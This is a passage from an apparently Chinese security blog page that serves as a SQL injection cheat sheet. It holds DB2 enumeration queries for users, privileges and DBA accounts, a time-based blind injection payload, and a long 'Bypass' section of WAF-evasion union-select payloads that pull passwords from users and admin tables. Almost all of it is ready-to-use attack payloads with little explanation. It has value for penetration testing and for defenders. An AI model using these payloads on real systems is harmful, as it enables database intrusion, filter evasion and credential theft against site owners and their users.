</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="comments">Comments</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select blah from foo -- comment like this (double dash)
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="current-user">Current User</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select user from sysibm.sysdummy1
</span></span><span class="line"><span class="cl">select session_user from sysibm.sysdummy1
</span></span><span class="line"><span class="cl">select system_user from sysibm.sysdummy1
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="list-users">List Users</h3>
<p>DB2 uses OS accounts</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select distinct(authid) from sysibmadm.privileges -- priv required
</span></span><span class="line"><span class="cl">select grantee from syscat.dbauth -- incomplete results
</span></span><span class="line"><span class="cl">select distinct(definer) from syscat.schemata -- more accurate
</span></span><span class="line"><span class="cl">select distinct(grantee) from sysibm.systabauth -- same as previous
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="list-privileges">List Privileges</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from syscat.tabauth -- shows priv on tables
</span></span><span class="line"><span class="cl">select * from syscat.tabauth where grantee = current user -- shows privs for current user
</span></span><span class="line"><span class="cl">select * from syscat.dbauth where grantee = current user;;
</span></span><span class="line"><span class="cl">select * from SYSIBM.SYSUSERAUTH — List db2 system privilegies
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="list-dba-accounts">List DBA Accounts</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select distinct(grantee) from sysibm.systabauth where CONTROLAUTH=&#39;Y&#39;
</span></span><span class="line"><span class="cl">select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’ or SYSADMAUTH = ‘G’
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="current-database">Current Database</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select current server from sysibm.sysdummy1
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="list-databases">List Databases</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select distinct(table_catalog) from sysibm.tables
</span></span><span class="line"><span class="cl">SELECT schemaname FROM syscat.schemata;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="list-columns">List Columns</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select name, tbname, coltype from sysibm.syscolumns -- also valid syscat and sysstat
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="list-tables">List Tables</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select table_name from sysibm.tables
</span></span><span class="line"><span class="cl">select name from sysibm.systables
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="find-tables-from-column-name">Find Tables From Column Name</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select tbname from sysibm.syscolumns where name=&#39;username&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="select-nth-row">Select Nth Row</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="select-nth-char">Select Nth Char</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select substr(&#39;abc&#39;,2,1) FROM sysibm.sysdummy1 -- returns b
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="bitwise-andornotxor">Bitwise AND/OR/NOT/XOR</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select bitand(1,0) from sysibm.sysdummy1 -- returns 0. Also available bitandnot, bitor, bitxor, bitnot
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ascii-value">ASCII Value</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Char	select chr(65) from sysibm.sysdummy1 -- returns &#39;A&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="char---ascii-value">Char -&gt; ASCII Value</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select ascii(&#39;A&#39;) from sysibm.sysdummy1 -- returns 65
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="casting">Casting</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select cast(&#39;123&#39; as integer) from sysibm.sysdummy1
</span></span><span class="line"><span class="cl">select cast(1 as char) from sysibm.sysdummy1
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="string-concat">String Concat</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select &#39;a&#39; concat &#39;b&#39; concat &#39;c&#39; from sysibm.sysdummy1 -- returns &#39;abc&#39;
</span></span><span class="line"><span class="cl">select &#39;a&#39; || &#39;b&#39; from sysibm.sysdummy1 -- returns &#39;ab&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="if-statement">IF Statement</h3>
<p>Seems only allowed in stored procedures. Use case logic instead.</p>
<h3 id="case-statement">Case Statement</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select CASE WHEN (1=1) THEN &#39;AAAAAAAAAA&#39; ELSE &#39;BBBBBBBBBB&#39; END from sysibm.sysdummy1
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="avoiding-quotes">Avoiding Quotes</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1 -- returns “ADRI”. Works without select too
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="time-delay">Time Delay</h3>
<p>Heavy queries, for example: If user starts with ascii 68 (&lsquo;D&rsquo;), the heavy query will be executed, delaying the response. However, if user doesn&rsquo;t start with ascii 68, the heavy query won&rsquo;t execute and thus the response will be faster.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)&gt;0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="serialize-to-xml-for-error-based">Serialize to XML (for error based)</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select xmlagg(xmlrow(table_schema)) from sysibm.tables -- returns all in one xml-formatted string
</span></span><span class="line"><span class="cl">select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) -- Same but without repeated elements
</span></span><span class="line"><span class="cl">select xml2clob(xmelement(name t, table_schema)) from sysibm.tables -- returns all in one xml-formatted string (v8). May need CAST(xml2clob(… AS varchar(500)) to display the result.
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="command-execution-and-local-file-access">Command Execution and Local File Access</h3>
<p>Seems it&rsquo;s only allowed from procedures or UDFs.</p>
<h3 id="hostnameip-and-os-info">Hostname/IP and OS INFO</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info -- requires priv
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="location-of-db-files">Location of DB Files</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from sysibmadm.reg_variables where reg_var_name=&#39;DB2PATH&#39; -- requires priv
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="system-config">System Config</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select dbpartitionnum, name, value from sysibmadm.dbcfg where name like &#39;auto_%&#39; -- Requires priv. Retrieve the automatic maintenance settings in the database configuration that are stored in memory for all database partitions.
</span></span><span class="line"><span class="cl">select name, deferred_value, dbpartitionnum from sysibmadm.dbcfg -- Requires priv. Retrieve all the database configuration parameters values stored on disk for all database partitions.
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="default-system-database">Default System Database</h3>
<ul>
<li>SYSIBM</li>
<li>SYSCAT</li>
<li>SYSSTAT</li>
<li>SYSPUBLIC</li>
<li>SYSIBMADM</li>
<li>SYSTOOLs</li>
</ul>
<h1 id="bypass">Bypass</h1>
<p>把每个SQL关键字两侧可插入的点称之为“位”，如下图：</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="http://image.xpshuai.cn/img/image-20220119124547715.png"
    data-srcset="http://image.xpshuai.cn/img/image-20220119124547715.png, http://image.xpshuai.cn/img/image-20220119124547715.png 1.5x, http://image.xpshuai.cn/img/image-20220119124547715.png 2x"
    data-sizes="auto"
    alt="http://image.xpshuai.cn/img/image-20220119124547715.png"
    title="http://image.xpshuai.cn/img/image-20220119124547715.png"/></p>
<h2 id="位置一">位置一</h2>
<p>(1)注释符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/**/ 
</span></span><span class="line"><span class="cl">%23 
</span></span><span class="line"><span class="cl">--+ 
</span></span><span class="line"><span class="cl">/*!50000union*/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># </span>
</span></span><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span>2/**/union <span class="k">select</span> 1,user,3 from admin
</span></span></code></pre></td></tr></table>
</div>
</div><p>(2)空白符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%09
</span></span><span class="line"><span class="cl">%0a
</span></span><span class="line"><span class="cl">%0b
</span></span><span class="line"><span class="cl">%0c
</span></span><span class="line"><span class="cl">%0d
</span></span><span class="line"><span class="cl">%20
</span></span><span class="line"><span class="cl">%a0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 
</span></span><span class="line"><span class="cl">id= 1 %0a union select 1,user,3 from admin
</span></span></code></pre></td></tr></table>
</div>
</div><p>(3)科学计算法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># e </span>
</span></span><span class="line"><span class="cl"><span class="c1"># .</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span> 2e0 union <span class="k">select</span> 1,user,3 from admin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span> 1.union <span class="k">select</span> 1,user,3 from admin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span> 1.1union <span class="k">select</span> 1,user,3 from admin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 还有:   %1%2E   %2%2E    %3%2E   </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span> 1<span class="err">&#39;</span>  %1%2Eunion <span class="k">select</span> user<span class="o">()</span>,2 %23
</span></span></code></pre></td></tr></table>
</div>
</div><p>(4)单引号双引号</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span> 1<span class="s1">&#39;  &#39;</span>xx<span class="s1">&#39;union select user(),2 %23
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">id= 1&#39;</span>  <span class="s2">&#34;&#34;</span>union <span class="k">select</span> user<span class="o">()</span>,2 %23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 需要闭合的先闭合，然后成对使用单双引号</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>(5)x@</p>
<p>假设SQL语句为：<code>select * from article where id = '2'</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># %@ *@ -@ +@ /@ &lt;@ =@ &gt;@ ^@ |@ %26@ -@&#39;&#39; -@&#34;&#34; -@@new</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span><span class="s1">&#39;  -@ union select 1,2 ,3 %23
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">id=&#39;</span>  %26@ union <span class="k">select</span> 1,2 ,3 %23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">id</span><span class="o">=</span><span class="s1">&#39;  -@&#39;&#39; union select 1,2 ,3 %23
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">id=&#39;</span> -@@new  union <span class="k">select</span> 1,2 ,3 %23
</span></span></code></pre></td></tr></table>
</div>
</div><p>(6){x key}</p>
<p>假设SQL语句为：<code>select * from article where id = '2'</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=</span><span class="s1">&#39; and {x -2} union select 1,2,3 %23
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">id=&#39;</span><span class="w">  </span><span class="o">||</span><span class="w">  </span><span class="o">!</span><span class="err">{</span><span class="o">`</span><span class="n">x</span><span class="o">`</span><span class="w"> </span><span class="o">-</span><span class="mi">2</span><span class="err">}</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="w"> </span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="s1">&#39;  ||  !{`x` -@} union select 1,2,3 %23
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">id=&#39;</span><span class="w">  </span><span class="k">and</span><span class="w"> </span><span class="err">{</span><span class="n">x</span><span class="w">  </span><span class="n">id</span><span class="err">}</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="w"> </span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="s1">&#39;  and {x  id} union select 1,2,3 %23
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">id=&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="err">{</span><span class="nf">id</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="cm">/**/</span><span class="o">--</span><span class="mi">0</span><span class="p">)</span><span class="err">}</span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="w"> </span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>(7) 其他</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\Nunion select 1,2,3 %23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">null union select 1,2,3 %23
</span></span></code></pre></td></tr></table>
</div>
</div><p>(8)函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and  MD5(&#39;a&#39;) union select 1,password,database() from users--+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">and binary @ union select 1,password,3 from users--+
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">and  ST_X(Point(1, 2)) union select 1,password,database() from users--+
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="位置二">位置二</h2>
<p>(1) 空白符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%09,%0a,%0b,%0c,%0d,%20
</span></span><span class="line"><span class="cl">id= 1  union%0aselect 1,user,3 from admin
</span></span></code></pre></td></tr></table>
</div>
</div><p>(2)注释</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/*!*/ /**/
</span></span><span class="line"><span class="cl">id= 1  union /**/select 1,user,3 from admin
</span></span></code></pre></td></tr></table>
</div>
</div><p>(3)括号</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">union(select  1,(password),3,4,5,6 from(users)) %23
</span></span></code></pre></td></tr></table>
</div>
</div><p>(4) ALL | DISTINCT | DISTINCTROW</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">union ALL select  1,password,3 from users %23
</span></span></code></pre></td></tr></table>
</div>
</div><p>(5)函数分隔</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%09%0A
</span></span><span class="line"><span class="cl">%0D%0b
</span></span><span class="line"><span class="cl">%0b%0A
</span></span><span class="line"><span class="cl">%09%0C
</span></span><span class="line"><span class="cl">%09%23%0A
</span></span><span class="line"><span class="cl">--%0A
</span></span><span class="line"><span class="cl">%23%0A
</span></span><span class="line"><span class="cl">--+\N%0A
</span></span><span class="line"><span class="cl">%23%f0%0A
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">union%23%0Aselect  1,password,3 from users %23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union-- xx%0Aselect  1,password,3 from users %23
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="位置三">位置三</h2>
<p>(1) 空白符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%09,%0a,%0b,%0c,%0d,%20
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union select %09 1,password,3 from users %23
</span></span></code></pre></td></tr></table>
</div>
</div><p>(2)注释</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/*!*/ /**/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union select /**/ 1,password,3 from users %23
</span></span></code></pre></td></tr></table>
</div>
</div><p>(3) ALL | DISTINCT | DISTINCTROW</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">union select ALL  1,password,3 from users %23
</span></span></code></pre></td></tr></table>
</div>
</div><p>(4) {} ()</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">union select{x 1},password,3 from users %23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">union select(1),password,3 from users %23
</span></span></code></pre></td></tr></table>
</div>
</div><p>(5)符号</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+ - @ ~ !
</span></span><span class="line"><span class="cl">union select+1,password,3 from users %23
</span></span><span class="line"><span class="cl">&#34; &#39; 单双引号
</span></span><span class="line"><span class="cl">union select&#34;&#34;a1,password,3 from users %23
</span></span><span class="line"><span class="cl">union select+1,password,3 from users %23
</span></span></code></pre></td></tr></table>
</div>
</div><p>组合</p>
<div class="highlight"><div class="chroma">
